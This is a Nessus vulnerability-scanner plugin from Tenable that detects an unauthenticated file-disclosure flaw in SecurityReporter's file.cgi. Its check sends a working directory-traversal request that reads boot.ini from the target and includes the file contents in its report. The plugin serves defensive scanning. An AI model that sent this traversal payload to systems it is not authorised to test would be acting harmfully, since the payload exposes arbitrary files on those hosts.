#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25994);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/05/13 15:33:30 $");

  script_cve_id("CVE-2007-3985", "CVE-2007-3986");
  script_bugtraq_id(25027);
  script_osvdb_id(43770, 45811);

  script_name(english:"SecurityReporter < 4.6.3p1 Multiple Vulnerabilities");
  script_summary(english:"Tries to retrieve a local file using SecurityReporter");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI application that is affected by
multiple issues.");
  script_set_attribute(attribute:"description", value:
"The 'file.cgi' script included with the version of SecurityReporter
installed on the remote host fails to sanitize input to the 'name'
parameter before returning the contents of the specified file and
supports bypassing authentication using specially crafted arguments.  An
unauthenticated, remote attacker can exploit these issues to retrieve
the contents of arbitrary files on the remote host. 

In addition, 'file.cgi' allows an attacker to bypass authentication
using a specially crafted 'name' parameter. 

Note that SecurityReporter is also known as 'Network Security Analyzer'
and is included in products from eIQnetworks, Top Layer Networks,
Clavister, Astaro, Reflex Security, H3C, Piolink, and MiraPoint.");
  script_set_attribute(attribute:"see_also", value:"http://www.oliverkarow.de/research/securityreporter.txt");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/474472/30/0/threaded");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 4.6.3 if necessary and then apply SecurityReporter
v4.6.3 patch 1.  Or contact the vendor for a patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2007/09/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "web_traversal.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 8216, 9216);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:8216);
if ( get_kb_item(strcat("www/", port, "/generic_traversal"))) exit(0);

# Try to exploit the issue to retrieve a file.
file = "boot.ini";

dirs = cgi_dirs();
foreach dir (dirs)
{
  url = strcat(dir, "/file.cgi?",
    "name=/eventcache/../../../../../../../../../../../", file);
  w = http_send_recv3(method:"GET", item: url, port:port);
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if looks like boot.ini.
  if ("[boot loader]">< res)
  {
    report = string(
      "\n",
      "Here are the contents of the file '\\boot.ini' that Nessus\n",
      "was able to read from the remote host through\n",
      build_url(port: port, qs: url),
      "\n",
      res
    );
    security_warning(port:port, extra:report);
    exit(0);
  }
}
